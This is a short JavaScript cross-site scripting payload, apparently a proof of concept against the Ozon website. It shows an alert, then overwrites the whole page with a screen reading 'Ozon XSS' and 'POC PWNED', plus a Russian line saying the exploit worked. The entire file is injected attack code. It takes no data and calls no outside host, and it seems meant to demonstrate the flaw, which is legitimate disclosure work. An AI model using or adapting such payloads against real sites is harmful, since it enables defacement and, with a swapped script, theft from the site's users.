alert('new_6');

(function() {
    setTimeout(function() {
        document.title = 'Ozon XSS';
        
        document.documentElement.innerHTML = `
            <head>
                <meta charset="UTF-8">
                <title>Ozon XSS</title>
            </head>
            <body style="background: #2b2b2b !important; color: #fff !important; margin:0; padding:0; display:flex; align-items:center; justify-content:center; height:100vh; width:100vw; font-family: sans-serif;">
                <div style="text-align: center;">
                    <h1 style="color: #fff;">POC PWNED</h1>
                    <p style="color: #fff;">Эксплойт сработал</p>
                </div>
            </body>
        `;
    }, 0);
})();
